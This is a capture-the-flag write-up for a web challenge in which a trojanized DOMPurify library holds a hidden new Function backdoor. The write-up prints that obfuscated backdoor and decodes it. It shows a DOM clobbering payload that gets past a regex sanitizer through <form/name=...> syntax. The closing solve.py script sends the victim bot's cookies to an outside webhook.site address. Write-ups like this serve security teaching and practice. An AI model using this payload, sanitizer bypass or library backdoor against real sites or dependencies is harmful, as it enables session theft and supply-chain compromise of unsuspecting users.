# Fortune Cookies

| Field       | Value                              |
|-------------|----------------------------------|
| Platform    | caliphallabsRooted 2026            |
| Category    | web (XSS)                          |
| Difficulty  | Medium                             |
| Points      | -                                  |
| Author      | -                                  |

## Description
> Comparte tu sabiduría con el mundo en nuestras galletas de la fortuna. Nuestro equipo de Control de Calidad revisará cada una de tus propuestas para asegurarse de que no escribes tonterías.

http://fortunecookies.challs.caliphallabs.com/

## TL;DR
XSS via DOM Clobbering exploiting a trojanized DOMPurify (96KB vs 23KB official). The modified DOMPurify contains a backdoor that executes `new Function(h.value)()` reading values from `document.forms['_config']`, and also adds `form`/`input` to the allowed tags. The server-side sanitizer is bypassed using `<tag/attr>` syntax (no space = no match in the regex).

## Initial Analysis

### Provided Files
```
Fortune_Cookies/
├── docker-compose.yml     # web (Flask :5000) + bot (Playwright)
├── web/
│   ├── app.py             # Flask server with HTML sanitizer
│   ├── static/js/
│   │   └── purify.min.js  # DOMPurify 3.3.1 MODIFIED (96,199 bytes)
│   └── ...
└── bot/
    └── bot.py             # Playwright bot that visits reported fortunes
```

### Reconnaissance

```
$ wc -c Fortune_Cookies/web/static/js/purify.min.js
96199  purify.min.js       ← challenge version

$ npm pack dompurify@3.3.1 && tar xzf dompurify-3.3.1.tgz
$ wc -c package/dist/purify.min.js
23129  purify.min.js       ← official version
```

**The challenge's DOMPurify is 4x larger than the official one.** This indicates manipulation/backdoor.

### Application Flow

```
User → POST /submit (fortune text)
         ↓
    sanitize_html() [server-side regex strip]
         ↓
    Stored in memory dict
         ↓
GET /view/<id>
    → DOMPurify.sanitize(fortune) [client-side]
    → container.innerHTML = sanitized
         ↓
GET /report/<id>
    → Writes fortune_id to /shared/queue.txt
    → Bot visits /view/<id> with cookie: flag=FLAG
```

### Key Source Code

**app.py -- Server-side sanitizer (lines 9-33):**
```python
def sanitize_html(text):
    text = re.sub(r'<!--.*?-->', '', text, flags=re.DOTALL | re.IGNORECASE)
    dangerous_tags = [
        'script', 'iframe', 'object', 'embed', 'applet', 'meta', 'link',
        'base', 'style', 'svg', 'math', 'template', 'frameset', 'frame',
        'noscript', 'xmp', 'plaintext', 'form', 'input', 'button', 'textarea',
        'select', 'option', 'video', 'audio', 'source', 'track', 'canvas',
        'details', 'summary', 'marquee', 'blink', 'layer', 'ilayer', 'div'
        'bgsound', 'basefont', 'portal', 'isindex', 'shadow', 'vibe', 'data'
    ]
    tag_pattern = r'|'.join(dangerous_tags)
    pattern = r'<(/?(?:' + tag_pattern + r'|on\w+))(?:\s+[^>]*?)?>'

    def _recursive_strip(current_text):
        match = re.search(pattern, current_text, flags=re.IGNORECASE)
        if match:
            new_text = re.sub(pattern, '', current_text, count=1, flags=re.IGNORECASE)
            return _recursive_strip(new_text)
        return current_text
    return _recursive_strip(text)
```

**app.py -- Fortune rendering (lines 111-139):**
```html
<head>
    <script src="/static/js/purify.min.js"></script>   <!-- DOMPurify in <head> -->
</head>
<body>
    <div id="fortune-content"></div>
    <script>
        var fortune = {{ fortune_text|tojson }};
        var container = document.getElementById('fortune-content');
        container.innerHTML = DOMPurify.sanitize(fortune);   <!-- client-side sanitize -->
    </script>
</body>
```

**bot.py -- Cookie with the flag (lines 12-17):**
```python
await context.add_cookies([{
    'name': 'flag',
    'value': FLAG,
    'domain': 'web',
    'path': '/'
}])
```

## Vulnerability Identified

### Type: XSS via DOM Clobbering + Backdoored Sanitizer Library

Chain of 3 vulnerabilities:

### Vuln 1: Trojanized DOMPurify (backdoor + allowed tags)

Beautifying (`jsbeautifier`) and diffing against the official version revealed injected code. The challenge version is obfuscated with unicode escapes (`\u0066\u006F\u0072\u006D\u0073` = `forms`) and meaningless XOR operations as noise (`_0x85bbgf = (364319 ^ 364312) + (629038 ^ 629030)`).

**Backdoor (beautified lines 287-300):**

```javascript
// Injected code — raw obfuscated:
!function(a, b) {
  function e(_0x85bbgf) {
    var d = b['\u0066\u006F\u0072\u006D\u0073']['\u005F\u0063\u006F\u006E\u0066\u0069\u0067'];
    if (d) {
      var e = b['\u0066\u006F\u0072\u006D\u0073'][d['\u0066\u0031']['\u0076\u0061\u006C\u0075\u0065']],
          f = e ? e[d['\u0069\u0031']['\u0076\u0061\u006C\u0075\u0065']] : null,
          g = f ? f['\u006F\u0077\u006E\u0065\u0072\u0044\u006F\u0063\u0075\u006D\u0065\u006E\u0074']
                     ['\u0066\u006F\u0072\u006D\u0073'][d['\u0066\u0032']['\u0076\u0061\u006C\u0075\u0065']] : null,
          h = g ? g[d['\u0069\u0032']['\u0076\u0061\u006C\u0075\u0065']] : null;
      h && new Function(h['\u0076\u0061\u006C\u0075\u0065'])();
    }
  }
  b['\u0072\u0065\u0061\u0064\u0079\u0053\u0074\u0061\u0074\u0065'] === "\u006C\u006F\u0061\u0064\u0069\u006E\u0067"
    ? b['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']
        ("\u0044\u004F\u004D\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u004C\u006F\u0061\u0064\u0065\u0064", e)
    : e();
}(_0x7f297c, document);
```

**Decoded to readable form:**

```javascript
!function(window, document) {
  function e() {
    var d = document.forms['_config'];      // DOM Clobbering target
    if (d) {
      var e = document.forms[d['f1']['value']],      // form named by f1.value
          f = e ? e[d['i1']['value']] : null,         // element named by i1.value
          g = f ? f.ownerDocument.forms[d['f2']['value']] : null,  // another form
          h = g ? g[d['i2']['value']] : null;         // element with the code
      h && new Function(h['value'])();                // ← ARBITRARY EXECUTION
    }
  }
  // Registers on DOMContentLoaded (or executes immediately if already loaded)
  document.readyState === "loading"
    ? document.addEventListener("DOMContentLoaded", e)
    : e();
}(window, document);
```

**Tags/attrs added to the allowlist:**

Comparing the allowed tag lists between the official and challenge versions (decoding the unicode escapes), it was identified that `form`, `input`, `select`, and `button` were added to the `ALLOWED_TAGS` array, along with `name` and `value` to the `ALLOWED_ATTR` array:

```
# Decoded excerpt from the allowed HTML tags array:
..."font","footer","form","h1","h2",...,"input","ins",...,"select",...
                    ^^^^                  ^^^^^          ^^^^^^
                    ADDED (not present in official DOMPurify)
```

### Vuln 2: Server-side sanitizer bypass with `/` as separator

The sanitizer regex:
```
<(/?(?:form|input|...))(?:\s+[^>]*?)?>
```

Requires **whitespace** (`\s+`) between the tag name and attributes. Using `/` instead of a space, the regex doesn't match because `/` is not `\s`:

```
<form name="_config">    ← regex MATCH → stripped
<form/name="_config">    ← regex NO MATCH → passes the filter
```

The browser's HTML5 parser treats `<form/name="x">` as `<form name="x">` (the `/` is ignored as a benign parse error).

Same bypass for closing tags:
```
</form>     ← regex MATCH → stripped
</form/>    ← regex NO MATCH → passes the filter
```

### Vuln 3: Missing comma in `dangerous_tags` (bonus)

```python
'layer', 'ilayer', 'div'        # line 17: missing comma at the end
'bgsound', 'basefont', ...      # line 18
```

Python concatenates adjacent strings: `'div' 'bgsound'` → `'divbgsound'`. Result: `div` is NOT blocked and `bgsound` isn't either. This wasn't needed for the exploit, but is notable.

## Solution Process

###  Web reconnaissance

```bash
$ curl -s http://fortunecookies.challs.caliphallabs.com/ | head -20
```

Flask application with a form to submit "fortunes". Endpoints:
- `POST /submit` -- submits fortune + author
- `GET /view/<id>` -- preview (with DOMPurify)
- `GET /report/<id>` -- triggers bot visit

###  Source code analysis

**Fortune data flow:**
1. POST `/submit` → `sanitize_html(fortune)` → stored in dict
2. GET `/view/<id>` → `{{ fortune_text|tojson }}` (Jinja2 escapes for JS) → `DOMPurify.sanitize(fortune)` → `innerHTML`

Double sanitization: server-side (regex) + client-side (DOMPurify). The `author` is not sanitized with `sanitize_html()` but is auto-escaped by Jinja2, so it is not an HTML injection vector.

###  Detect trojanized DOMPurify

```bash
$ wc -c purify.min.js                    # 96,199 bytes
$ npm pack dompurify@3.3.1               # download official
$ wc -c package/dist/purify.min.js       # 23,129 bytes
```

4x difference → backdoor confirmed.

```bash
$ pip install jsbeautifier
$ python3 -c "import jsbeautifier; ..."   # beautify both
$ diff /tmp/purify_official.js /tmp/purify_challenge.js | head -200
```

Massive diff: the challenge version is completely obfuscated with unicode escapes, variables like `_0x85bbgf`, and XOR noise. However, the functional structure is the same except for:
1. IIFE backdoor block with `document.forms` → `new Function()`
2. `form`, `input`, `select`, `button` added to ALLOWED_TAGS
3. `name`, `value` added to ALLOWED_ATTR

###  Analyze the backdoor

The backdoor executes a DOM navigation chain:

```
document.forms['_config']
  │
  ├─ .f1.value = 'formA'      → document.forms['formA']
  ├─ .i1.value = 'x'          → formA['x'] (any element)
  │                                 │
  │                                 └─ .ownerDocument.forms[...]
  ├─ .f2.value = 'formB'      → document.forms['formB']
  └─ .i2.value = 'code'       → formB['code']
                                     │
                                     └─ .value → new Function(VALUE)()
```

**Critical timing:**
1. DOMPurify loads in `<head>` → the backdoor registers a listener on `DOMContentLoaded`
2. Inline script at the end of `<body>`: `container.innerHTML = DOMPurify.sanitize(fortune)` → injects our forms into the DOM
3. `DOMContentLoaded` fires AFTER all HTML (including our innerHTML) has been parsed → the backdoor finds the forms → executes code

###  Build the payload

We need 3 forms that pass both sanitizers:

```html
<!-- Form 1: backdoor configuration -->
<form/name="_config">
  <input/name="f1"/value="formA">
  <input/name="i1"/value="x">
  <input/name="f2"/value="formB">
  <input/name="i2"/value="code">
</form/>

<!-- Form 2: bridge element (required by the chain) -->
<form/name="formA">
  <input/name="x"/value="dummy">
</form/>

<!-- Form 3: JavaScript payload -->
<form/name="formB">
  <input/name="code"/value="fetch('https://webhook.site/UUID?c='+document.cookie)">
</form/>
```

Local bypass verification:
```python
>>> sanitize_html(payload) == payload
True  # ← passes through the server-side filter intact
```

###  Exploitation

```bash
$ python3 solve.py --remote
[*] Target: http://fortunecookies.challs.caliphallabs.com
[*] Webhook: https://webhook.site/0ca280fd-fd37-4611-9dff-c2f0f6c4c55a
[*] Payload length: 345
[*] Submitting fortune...
[*] Submit status: 200
[+] Fortune ID: 508724cc
[*] Previewing fortune...
[*] View status: 200
[+] Forms present in page - payload looks good!
[*] Reporting to bot...
[*] Report status: 200

[*] Waiting for bot to visit...
..
[+] Got callback!
[+] Cookie: {'c': 'flag=clctf{cl0b_cl0bb3r3d_cl0bb3r1ng_cl0bcl0b}'}
```

## Final Exploit

### solve.py

```python
#!/usr/bin/env python3
"""
Challenge: Fortune Cookies
Category:  web
Platform:  caliphallabsRooted2026

XSS via DOM clobbering through backdoored DOMPurify.
Server-side regex filter bypassed with <tag/attr> syntax.
"""
import requests
import sys
import re
import time

# === CONFIGURATION ===
LOCAL_URL = "http://localhost:5000"
REMOTE_URL = "http://fortunecookies.challs.caliphallabs.com"
WEBHOOK_UUID = "0ca280fd-fd37-4611-9dff-c2f0f6c4c55a"
WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_UUID}"

BASE = REMOTE_URL if "--remote" in sys.argv else LOCAL_URL
session = requests.Session()

def exploit():
    # JS payload: exfiltrate cookies to webhook
    js_code = f"fetch('{WEBHOOK_URL}?c='+document.cookie)"

    # DOM Clobbering payload for backdoored DOMPurify
    # Bypass server-side regex: <tag/attr> instead of <tag attr>
    # Bypass </tag>: </tag/> (/ prevents > from matching regex)
    payload = (
        '<form/name="_config">'
        '<input/name="f1"/value="formA">'
        '<input/name="i1"/value="x">'
        '<input/name="f2"/value="formB">'
        '<input/name="i2"/value="code">'
        '</form/>'
        '<form/name="formA">'
        '<input/name="x"/value="dummy">'
        '</form/>'
        '<form/name="formB">'
        '<input/name="code"/value="' + js_code + '">'
        '</form/>'
    )

    print(f"[*] Target: {BASE}")
    print(f"[*] Webhook: {WEBHOOK_URL}")
    print(f"[*] Payload length: {len(payload)}")

    #  Submit fortune with XSS payload
    print("[*] Submitting fortune...")
    r = session.post(f"{BASE}/submit", data={"fortune": payload, "author": "test"})
    print(f"[*] Submit status: {r.status_code}")

    # Extract fortune_id
    match = re.search(r'/view/([a-f0-9\-]+)', r.text)
    if not match:
        print("[-] Could not find fortune_id"); return
    fortune_id = match.group(1)
    print(f"[+] Fortune ID: {fortune_id}")

    #  Verify forms survive sanitization
    r = session.get(f"{BASE}/view/{fortune_id}")
    if "_config" not in r.text:
        print("[-] Forms stripped - check payload"); return
    print("[+] Forms present in page")

    #  Report to bot
    r = session.get(f"{BASE}/report/{fortune_id}")
    print(f"[*] Reported to bot (status {r.status_code})")

    #  Poll webhook for cookie
    print(f"[*] Waiting for callback...")
    for i in range(30):
        time.sleep(2)
        r = requests.get(f"https://webhook.site/token/{WEBHOOK_UUID}/requests",
                        headers={"Accept": "application/json"})
        if r.status_code == 200 and r.json().get("data"):
            for req in r.json()["data"]:
                print(f"\n[+] Cookie: {req.get('query', {})}")
                return
        sys.stdout.write("."); sys.stdout.flush()
    print("\n[-] Timeout")

if __name__ == "__main__":
    exploit()
```

### Execution

```bash
python3 solve.py             # Local (with docker-compose up)
python3 solve.py --remote    # Remote
```

## Flag
```
clctf{cl0b_cl0bb3r3d_cl0bb3r1ng_cl0bcl0b}
```

## Key Lessons
- **Compare library sizes**: a 96KB DOMPurify vs 23KB official is a clear sign of manipulation. Always verify the integrity of client-side dependencies
- **DOM Clobbering**: injecting HTML forms allows controlling `document.forms[name]`, which is a powerful primitive when a library reads from the DOM
- **HTML5 quirk**: `<form/name="x">` is parsed as `<form name="x">` by browsers, but regex filters expecting `\s+` between tag and attributes don't detect it
- **`</tag/>` bypass**: the extra `/` before `>` breaks the regex match `(?:\s+[^>]*?)?>` without affecting the browser's HTML parsing
- **DOMContentLoaded timing**: content injected via `innerHTML` in an inline script is in the DOM before `DOMContentLoaded` fires, allowing the backdoor to find the forms
- **The flag name confirms it**: "cl0b cl0bb3r3d cl0bb3r1ng" = DOM Clobbering was the intended technique
